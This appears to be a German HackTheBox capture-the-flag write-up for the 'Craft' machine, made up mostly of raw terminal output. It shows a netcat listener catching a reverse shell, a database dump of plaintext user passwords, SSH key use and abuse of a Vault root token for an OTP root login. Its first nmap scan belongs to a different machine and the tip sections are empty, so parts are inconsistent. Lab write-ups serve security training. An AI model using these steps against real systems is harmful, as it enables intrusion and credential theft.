---
title: "HackTheBox - Craft"
date: 2010-01-01T01:01:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
---

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)

# HackTheBox - Craft WriteUp | Tipps + Anleitung | htb

[Craft](https://www.hackthebox.eu/home/machines/profile/101) ist eine der mittelschweren Maschinen von [HackTheBox](https://hackthebox.eu/). Ihre Eigenschaften wurden von Benutzern auf Enumeration, Real-Life und Custom Exploitation festgelegt.

![](https://imgur.com/FMoIkDG,jpg)![schwierigkeitsgrad](https://i.imgur.com/iP9UKOM.jpg)

## **Tipps**

[su_spoiler title="Tipp 1" open="no" style="modern-light" icon="plus" anchor="" class=""]

[/su_spoiler]

[su_spoiler title="Tipp 2" open="no" style="modern-light" icon="plus" anchor="" class=""]

[/su_spoiler]

[su_spoiler title="Tipp 3" open="no" style="modern-light" icon="plus" anchor="" class=""]

[/su_spoiler]

## **Video**

[su_spoiler title="Kurzes Video Walkthrough ohne Erklärungen" open="no" style="modern-light" icon="plus" anchor="" class=""]

<iframe width="560" height="314" src="//www.youtube.com/embed/CHqJ8wt7Th8" allowfullscreen="allowfullscreen"></iframe>

[/su_spoiler]

## **Anleitung**

[su_accordion]

[su_spoiler title="Schritt 1" open="no" style="modern-light" icon="plus" anchor="" class=""]

Als erstes machen wir natürlich einen Nmap-Scan.

<pre class="lang:default mark:15,20 decode:true">root@kali:~# nmap -A 10.10.10.55

[...]
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
| 256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_ 256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (EdDSA)
8009/tcp open ajp13 Apache Jserv (Protocol v1.3)
| ajp-methods:
| Supported methods: GET HEAD POST PUT DELETE OPTIONS
| Potentially risky methods: PUT DELETE
|_ See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open http Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
| http-methods:
|_ Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat/8.5.5 - Error report
60000/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title:         Kotarak Web Hosting        
[...]
</pre>

2 offene Webserver Ports wurden gefunden.

[/su_spoiler]

[/su_accordion]

root@kali:~# nmap -sV 10.10.10.110  
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-06 23:28 CET  
Nmap scan report for 10.10.10.110  
Host is up (0.026s latency).  
Not shown: 998 closed ports  
PORT STATE SERVICE VERSION  
22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)  
443/tcp open ssl/http nginx 1.15.8  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 14.07 seconds  
root@kali:~# vim /etc/hosts  
root@kali:~# vim test.py

root@kali:~# python test.py  
/usr/local/lib/python2.7/dist-packages/requests/packages/urllib3/connectionpool.py:789: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: h  
ttps://urllib3.readthedocs.org/en/latest/security.html  
InsecureRequestWarning)  
/usr/local/lib/python2.7/dist-packages/requests/packages/urllib3/connectionpool.py:789: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: h  
ttps://urllib3.readthedocs.org/en/latest/security.html  
InsecureRequestWarning)  
{"message":"Token is valid!"}

Create bogus ABV brew  
/usr/local/lib/python2.7/dist-packages/requests/packages/urllib3/connectionpool.py:789: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: h  
ttps://urllib3.readthedocs.org/en/latest/security.html  
InsecureRequestWarning)  
<html>  
<head><title>504 Gateway Time-out</title></head>  
<body>  
<center><h1>504 Gateway Time-out</h1></center>  
<hr><center>nginx/1.15.8</center>  
</body>  
</html>

root@kali:~# ifconfig tun0 [161/161]  
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500  
inet 10.10.14.90 netmask 255.255.254.0 destination 10.10.14.90  
inet6 dead:beef:2::1058 prefixlen 64 scopeid 0x0<global>  
inet6 fe80::c7d0:a309:9c9:4cf prefixlen 64 scopeid 0x20<link>  
unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 100 (UNSPEC)  
RX packets 8007 bytes 6854024 (6.5 MiB)  
RX errors 0 dropped 0 overruns 0 frame 0  
TX packets 6960 bytes 467284 (456.3 KiB)  
TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

root@kali:~# nc -lnvp 1234  
listening on [any] 1234 ...  
connect to [10.10.14.90] from (UNKNOWN) [10.10.10.110] 34871  
/bin/sh: can't access tty; job control turned off  
/opt/app # whoami  
root  
/opt/app # ls -alh /  
total 64  
drwxr-xr-x 1 root root 4.0K Feb 10 2019 .  
drwxr-xr-x 1 root root 4.0K Feb 10 2019 ..  
-rwxr-xr-x 1 root root 0 Feb 10 2019 .dockerenv  
drwxr-xr-x 1 root root 4.0K Feb 6 2019 bin  
drwxr-xr-x 5 root root 340 Jan 6 13:39 dev  
drwxr-xr-x 1 root root 4.0K Feb 10 2019 etc  
drwxr-xr-x 2 root root 4.0K Jan 30 2019 home  
drwxr-xr-x 1 root root 4.0K Feb 6 2019 lib  
drwxr-xr-x 5 root root 4.0K Jan 30 2019 media  
drwxr-xr-x 2 root root 4.0K Jan 30 2019 mnt  
drwxr-xr-x 1 root root 4.0K Feb 9 2019 opt  
dr-xr-xr-x 254 root root 0 Jan 6 13:39 proc  
drwx------ 1 root root 4.0K Jan 6 17:03 root  
drwxr-xr-x 2 root root 4.0K Jan 30 2019 run  
drwxr-xr-x 2 root root 4.0K Jan 30 2019 sbin  
drwxr-xr-x 2 root root 4.0K Jan 30 2019 srv  
dr-xr-xr-x 13 root root 0 Jan 6 13:39 sys  
drwxrwxrwt 1 root root 4.0K Jan 6 21:38 tmp  
drwxr-xr-x 1 root root 4.0K Feb 9 2019 usr  
drwxr-xr-x 1 root root 4.0K Jan 30 2019 var  
/opt/app # ls -alh  
total 44  
drwxr-xr-x 5 root root 4.0K Jan 6 21:18 .  
drwxr-xr-x 1 root root 4.0K Feb 9 2019 ..  
drwxr-xr-x 8 root root 4.0K Feb 8 2019 .git  
-rw-r--r-- 1 root root 18 Feb 7 2019 .gitignore  
-rw-r--r-- 1 root root 1.5K Feb 7 2019 app.py  
drwxr-xr-x 5 root root 4.0K Feb 7 2019 craft_api  
-rwxr-xr-x 1 root root 673 Feb 8 2019 dbtest.py  
-rwxr-xr-x 1 root root 673 Jan 6 21:18 dbtest2.py  
-rw-r--r-- 1 root root 636 Jan 6 19:47 dbtestv1.py  
-rw-r--r-- 1 root root 635 Jan 6 14:05 dbtestv2.py  
drwxr-xr-x 2 root root 4.0K Feb 7 2019 tests

/opt/app # cat dbtest.py #!/usr/bin/env python

import pymysql  
from craft_api import settings # test connection to mysql database connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,  
user=settings.MYSQL_DATABASE_USER, password=settings.MYSQL_DATABASE_PASSWORD, db=settings.MYSQL_DATABASE_DB,  
cursorclass=pymysql.cursors.DictCursor) try:  
with connection.cursor() as cursor: sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1" cursor.execute(sql)  
result = cursor.fetchone() print(result)  
finally:  
connection.close()/opt/app # cp dbtest.py dbtestcopy.py

cat dbtest2.py  
#!/usr/bin/env python

import pymysql  
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,  
user=settings.MYSQL_DATABASE_USER,  
password=settings.MYSQL_DATABASE_PASSWORD,  
db=settings.MYSQL_DATABASE_DB,  
cursorclass=pymysql.cursors.DictCursor)

try:  
with connection.cursor() as cursor:  
sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"  
cursor.execute(sql)  
result = cursor.fetchone()  
print(result)

finally:  
connection.close()/opt/app # cat dbtestv1.py  
#!/usr/bin/env python

import pymysql  
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,  
user=settings.MYSQL_DATABASE_USER,  
password=settings.MYSQL_DATABASE_PASSWORD,  
db=settings.MYSQL_DATABASE_DB,  
cursorclass=pymysql.cursors.DictCursor)

try:  
with connection.cursor() as cursor:  
sql = "SELECT * FROM user"  
cursor.execute(sql)  
result = cursor.fetchall()  
print(result)

finally:  
connection.close()  
/opt/app # python dbtestv1.py  
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]

root@kali:~# vim id_rsa  
root@kali:~# chmod 600 id_rsa  
root@kali:~# ssh gilfoyle@10.10.10.110 -i id_rsa

. * .. . * *  
* * @()Ooc()* o .  
(Q@*0CG*O() ___  
|\_________/|/ _ \  
| | | | | / | |  
| | | | | | | |  
| | | | | | | |  
| | | | | | | |  
| | | | | | | |  
| | | | | \_| |  
| | | | |\___/  
|\_|__|__|_/|  
\_________/

Enter passphrase for key 'id_rsa':  
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
Last login: Mon Jan 6 14:53:11 2020 from 10.10.15.47  
gilfoyle@craft:~$ ls  
user.txt  
gilfoyle@craft:~$ cat user.txt  
bbf#########ZENSIERT#########2d4  
gilfoyle@craft:~$ clear  
gilfoyle@craft:~$ ls -alh  
total 44K  
drwx------ 6 gilfoyle gilfoyle 4.0K Jan 6 14:59 .  
drwxr-xr-x 3 root root 4.0K Feb 9 2019 ..  
-rw-r--r-- 1 gilfoyle gilfoyle 634 Feb 9 2019 .bashrc  
drwx------ 3 gilfoyle gilfoyle 4.0K Feb 9 2019 .config  
drwx------ 2 gilfoyle gilfoyle 4.0K Jan 6 12:45 .gnupg  
drwxr-xr-x 2 gilfoyle gilfoyle 4.0K Jan 6 12:20 .nano  
-rw-r--r-- 1 gilfoyle gilfoyle 148 Feb 8 2019 .profile  
drwx------ 2 gilfoyle gilfoyle 4.0K Feb 9 2019 .ssh  
-rw------- 1 gilfoyle gilfoyle 36 Jan 6 15:00 .vault-token  
-rw------- 1 gilfoyle gilfoyle 3.5K Jan 6 14:58 .viminfo  
-r-------- 1 gilfoyle gilfoyle 33 Feb 9 2019 user.txt  
gilfoyle@craft:~$ cat .vault-token  
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9

gilfoyle@craft:~$ vault token capabilities f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9  
root  
gilfoyle@craft:~$ vault login  
Token (will be hidden):  
Success! You are now authenticated. The token information displayed below  
is already stored in the token helper. You do NOT need to run "vault login"  
again. Future Vault requests will automatically use this token.

Key Value  
--- -----  
token f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9  
token_accessor 1dd7b9a1-f0f1-f230-dc76-46970deb5103  
token_duration ∞  
token_renewable false  
token_policies ["root"]  
identity_policies []  
policies ["root"]  
gilfoyle@craft:~$ vault ssh -mode otp root@localhost  
WARNING: No -role specified. Use -role to tell Vault which ssh role to use for  
authentication. In the future, you will need to tell Vault which role to use.  
For now, Vault will attempt to guess based on the API response. This will be  
removed in the Vault 1.1.  
Vault SSH: Role: "root_otp"  
Vault could not locate "sshpass". The OTP code for the session is displayed  
below. Enter this code in the SSH password prompt. If you install sshpass,  
Vault can automatically perform this step for you.  
OTP for the session is: 3ed24235-8265-5927-dc3a-93b0d5ed2a8f

. * .. . * *  
* * @()Ooc()* o .  
(Q@*0CG*O() ___  
|\_________/|/ _ \  
| | | | | / | |  
| | | | | | | |  
| | | | | | | |  
| | | | | | | |  
| | | | | | | |  
| | | | | \_| |  
| | | | |\___/  
|\_|__|__|_/|  
\_________/

Password:  
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
Last login: Mon Jan 6 15:02:08 2020 from 127.0.0.1  
root@craft:~# cat /root/root.txt  
831#########ZENSIERT#########591  
root@craft:~#